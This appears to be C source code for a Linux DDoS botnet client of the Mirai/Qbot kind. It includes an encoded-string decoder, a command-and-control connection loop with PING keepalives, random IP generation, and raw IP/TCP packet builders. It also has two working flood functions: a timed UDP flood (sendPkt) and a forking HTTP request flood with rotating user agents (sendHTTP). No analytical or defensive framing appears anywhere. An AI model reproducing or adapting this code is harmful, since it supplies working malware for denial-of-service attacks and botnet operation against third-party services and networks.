
#ifdef FREEBSD
#define PATH_MAX 260
#endif
#include <dirent.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <stdio.h>
#include <poll.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/resource.h> //for max fds settings
#ifdef ENEMY
#include <assert.h>
void __assert_fail(const char * assertion, const char * file, unsigned int line, const char * function)
{
    abort();
}
#include "libssh2.h"
#endif
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define SOCKBUF_SIZE 1024
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | ((((unsigned long)(n) & 0xff00)) << 8) | ((((unsigned long)(n) & 0xff0000)) >> 8) | ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error
#endif
#define INET_ADDR(o1,o2,o3,o4) (HTONL((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define STARTUP
char encodes[] = { 
	'%', 'q', '*', 'K', 'C', ')', '&', 'F', '9', '8', 'f', 's', 'r', '2', 't', 'o', '4', 'b', '3', 'y', 'i', '_', ':', 'w', 'B', '>', 'z', '=', ';', '!', 'k', '?', '"', 'E', 'A', 'Z', '7', '.', 'D', '-', 'm', 'd', '<', 'e', 'x', '5', 'U', '~', 'h', ',', 'j', '|', '$', 'v', '6', 'c', '1', 'g', 'a', '+', 'p', '@', 'u', 'n'
	
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
	'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char decoded[512];

char *decode(char *str)
{
	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				decoded[i] = decodes[c];
				i++;
			}
		}
		x++;
	}
	decoded[i] = '\0';

	return decoded;
}

unsigned char *fdgets(unsigned char *, int, int);
int initConnection();
void RandString(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);
char * inet_ntoa(struct in_addr in );
int fd_cnc = -1, gotIP = 0;
unsigned char ldserver[41]; // EDIT SIZE HERE
uint32_t * pids;
int rangechoice = 1;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
  0
};



int util_strlen(char *str) {
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}
int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}
/*
char *mygethostbyname(char *hostname) {
	
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, hostname, &(sa.sin_addr));
    if(result != 0) {
		return hostname;
	}
    int sockfd;
    struct addrinfo hints, * servinfo, * p;
    struct sockaddr_in * h;
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(hostname, NULL, &hints,&servinfo)) != 0) {
        return 1;
    }

    // loop through all the results and connect to the first we can
    for (p = servinfo; p != NULL; p = p->ai_next) {
        h = (struct sockaddr_in * ) p->ai_addr;
        return inet_ntoa(h->sin_addr);
    }

    freeaddrinfo(servinfo); // all done with this structure
    return 0;
}*/
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
void trim(char * str) {
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (util_isspace(str[begin])) begin++;
  while ((end >= begin) && util_isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}


int getHost(unsigned char * toGet, struct in_addr * in) {
    struct hostent *he;
    struct in_addr **addr_list;
        
    if ( (he = gethostbyname( toGet ) ) == NULL) 
    {
       if ((in->s_addr = inet_addr(toGet)) == -1) return 1; // gethostbyname failed, is ip address
    } else {
        *in = *((struct in_addr*) he->h_addr_list[0]);
    }
    return 0;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = HTONS(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}


int mytoupper(int ch)
{
        if(ch >= 'a' && ch <= 'z')
                return ('A' + ch - 'a');
        else
                return ch;
}
void uppercase(unsigned char * str) {
  while ( * str) { * str = mytoupper( * str);
    str++;
  }
}

void RandString(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}
int recvLine(unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        fd_set errors;
        struct timeval tv;
        tv.tv_sec = 7;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_ZERO(&errors);
        FD_SET(fd_cnc, &myset);
        FD_SET(fd_cnc, &errors);
        int selectRtn, retryCount, dataAvailable;
        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                if(FD_ISSET(fd_cnc, &errors)) return -1;
                while(retryCount < 10)
                {
                        sockprintf(fd_cnc, "PING");
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_ZERO(&errors);
                        FD_SET(fd_cnc, &myset);
                        FD_SET(fd_cnc, &errors);
                        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                                if(FD_ISSET(fd_cnc, &errors)) return -1;
                                retryCount++;
                                continue;
                        }
                        if(FD_ISSET(fd_cnc, &errors)) return -1;
                        break;
                }
        }

        if(FD_ISSET(fd_cnc, &errors)) return -1;
        ioctl(fd_cnc, FIONREAD, &dataAvailable);
        if(dataAvailable) {
            unsigned char tmpchr;
            unsigned char *cp;
            int count = 0;

            cp = buf;
            while(bufsize-- > 1)
            {
                    if(recv(fd_cnc, &tmpchr, 1, 0) == 0) {
                            *cp = 0x00;
                            return -1;
                    }
                    *cp++ = tmpchr;
                    if(tmpchr == '\n') break;
                    count++;
            }
            *cp = 0x00;

//      zprintf("recv: %s\n", cp);
    
            return count;
        } else {
            return 0;
        }
}
int listFork() {
  uint32_t parent, * newpids, i;
  parent = fork();
  if (parent <= 0) return parent;
  numpids++;
  newpids = (uint32_t * ) malloc((numpids + 1) * 4);
  for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
  newpids[numpids - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short * buf, int count) {
  register uint64_t sum = 0;
  while (count > 1) {
    sum += * buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += * (unsigned char * ) buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}
/* Copyright (C) 1991,92,93,95,96,97,98,99,2000 Free Software Foundation, Inc.
   This file is part of the GNU C Library.
   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.
   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.
   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, write to the Free
   Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
   02111-1307 USA.  */
#include <sys/types.h>
#include <netinet/in.h>
struct timestamp
  {
    uint8_t len;
    uint8_t ptr;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int flags:4;
    unsigned int overflow:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int overflow:4;
    unsigned int flags:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    uint32_t data[9];
  };
struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
    /*The options start here. */
  };
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;		/* header length */
    unsigned int ip_v:4;		/* version */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;		/* version */
    unsigned int ip_hl:4;		/* header length */
#endif
    uint8_t ip_tos;			/* type of service */
    u_short ip_len;			/* total length */
    u_short ip_id;			/* identification */
    u_short ip_off;			/* fragment offset field */
#define	IP_RF 0x8000			/* reserved fragment flag */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    uint8_t ip_ttl;			/* time to live */
    uint8_t ip_p;			/* protocol */
    u_short ip_sum;			/* checksum */
    struct in_addr ip_src, ip_dst;	/* source and dest address */
  };
/*
 * Time stamp option structure.
 */
struct ip_timestamp
  {
    uint8_t ipt_code;			/* IPOPT_TS */
    uint8_t ipt_len;			/* size of structure (variable) */
    uint8_t ipt_ptr;			/* index of current entry */
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ipt_flg:4;		/* flags, see below */
    unsigned int ipt_oflw:4;		/* overflow counter */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ipt_oflw:4;		/* overflow counter */
    unsigned int ipt_flg:4;		/* flags, see below */
#endif
    uint32_t data[9];
  };
/*
 * User-settable options (used with setsockopt).
 */
#define	TCP_NODELAY	 1	/* Don't delay send to coalesce packets  */

typedef	uint32_t tcp_seq;
/*
 * TCP header.
 * Per RFC 793, September, 1981.
 */
struct tcphdr
  {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
#  if __BYTE_ORDER == __LITTLE_ENDIAN
    uint16_t res1:4;
    uint16_t doff:4;
    uint16_t fin:1;
    uint16_t syn:1;
    uint16_t rst:1;
    uint16_t psh:1;
    uint16_t ack:1;
    uint16_t urg:1;
    uint16_t res2:2;
#  elif __BYTE_ORDER == __BIG_ENDIAN
    uint16_t doff:4;
    uint16_t res1:4;
    uint16_t res2:2;
    uint16_t urg:1;
    uint16_t ack:1;
    uint16_t psh:1;
    uint16_t rst:1;
    uint16_t syn:1;
    uint16_t fin:1;
#  else
#   error "Adjust your <bits/endian.h> defines"
#  endif
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};
enum
{
  TCP_ESTABLISHED = 1,
  TCP_SYN_SENT,
  TCP_SYN_RECV,
  TCP_FIN_WAIT1,
  TCP_FIN_WAIT2,
  TCP_TIME_WAIT,
  TCP_CLOSE,
  TCP_CLOSE_WAIT,
  TCP_LAST_ACK,
  TCP_LISTEN,
  TCP_CLOSING   /* now a valid state */
};
unsigned short tcpcsum(struct iphdr * iph, struct tcphdr * tcph) {

  struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
  }
  pseudohead;
  unsigned short total_len = iph->tot_len;
  pseudohead.src_addr = iph->saddr;
  pseudohead.dst_addr = iph->daddr;
  pseudohead.zero = 0;
  pseudohead.proto = IPPROTO_TCP;
  pseudohead.length = HTONS(sizeof(struct tcphdr));
  int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
  unsigned short * tcp = malloc(totaltcp_len);
  memcpy((unsigned char * ) tcp, & pseudohead, sizeof(struct tcp_pseudo));
  memcpy((unsigned char * ) tcp + sizeof(struct tcp_pseudo), (unsigned char * ) tcph, sizeof(struct tcphdr));
  unsigned short output = csum(tcp, totaltcp_len);
  free(tcp);
  return output;
}

void makeIPPacket(struct iphdr * iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + packetSize;
  iph->id = rand_cmwc();
  iph->frag_off = 0;
  iph->ttl = 255;
  iph->protocol = protocol;
  iph->check = 0;
  iph->saddr = source;
  iph->daddr = dest;
}


int sclose(int fd) {
  if (3 > fd) return 1;
  close(fd);
  return 0;
}

int socket_connect(char * host, uint16_t port) {
  struct hostent * hp;
  struct sockaddr_in addr;
  int on = 1, sock;

  if ((hp = gethostbyname(host)) == NULL) return 0;
  bcopy(hp->h_addr, & addr.sin_addr, hp->h_length);
  addr.sin_port = HTONS(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));
  if (sock == -1) return 0;
  if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
    return 0;
  return sock;
}
void sendPkt(unsigned char *host, int port, int secs) {
	int a = 0;
	int start = time(NULL);
    int sockfd, portno, n;
    int serverlen;
    struct sockaddr_in serveraddr;

    /* socket: create the socket */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) 
        return;


    /* build the server's Internet address */
    bzero((char *) &serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    if (getHost(host, & serveraddr.sin_addr)) return;
    serveraddr.sin_port = HTONS(port);

    /* send the message to the server */
    serverlen = sizeof(serveraddr);
while(1){
char *randstrings[] = {"PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{

    n = sendto(sockfd, STD2_STRING, strlen(STD2_STRING), 0, (struct sockaddr *)&serveraddr, serverlen);
if (time(NULL) >= start + secs)
{
_exit(0);
}
a = 0;
}
a++;
}
}

const char * useragents[] = {
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
  "Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
  "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
  "Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
  "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
  "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
  "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
  "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
  "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
  "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
};

void sendHTTP(char * method, char * host, uint16_t port, char * path, int timeFoo, int power) {
    const char * connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
    int i, timeEnd = time(NULL) + timeFoo;
    char request[2048];
    sprintf(request, "%s %s %s/%s\r\n%s: %s\r\n%s-%s: %s\r\n\r\n", method, path, decode("ecc|"), decode("quq"), decode("DBwwtr!3Bw"), connections[(rand() % 3)], decode("1;t="), decode("74tw!"), useragents[rand() % NUMITEMS(useragents)]);
    for (i = 0; i < power; i++) {
        if (fork()) {
            while (timeEnd > time(NULL)) {
                int sock = socket_connect((char * ) host, port);
                if (sock != 0) {
                    write(sock, request, strlen(request));
                    close(sock);
                }
            }
           _exit(1);
        }
    }
}

